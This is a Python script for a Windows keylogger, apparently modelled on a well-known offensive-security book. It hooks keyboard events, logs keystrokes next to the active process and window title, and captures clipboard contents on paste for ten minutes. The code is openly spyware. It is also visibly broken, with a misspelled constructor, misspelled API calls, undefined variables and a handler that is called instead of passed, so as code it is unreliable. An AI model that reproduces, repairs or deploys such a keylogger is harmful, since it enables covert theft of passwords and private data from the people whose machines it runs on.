from ctypes import byref,create_string_buffer,c_ulong,windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __int__(self):
        self.current.window = None
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd,pid)
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)

        h_process = windll.kernel32.Openprocess(0x400|0x10,False,pid)
        windll.psapi.GetModuleBaseNameA(h_process,None,byref(window_title),512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeError as e:
            print(f'{e} window name unknow')

        print('\n',process_id,executable.value.decode(),self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystore(self):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii),end="")

        else:
            if event.key == "V":
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')

            else:
                print(f'{event.key}')
        return log

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    k1 = KeyLogger()
    hm = pyHook.HookeManager()
    hm.KeyDown = k1.mykeystore()
    hm.HookKeyBoard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    print(run())
    print('done.')
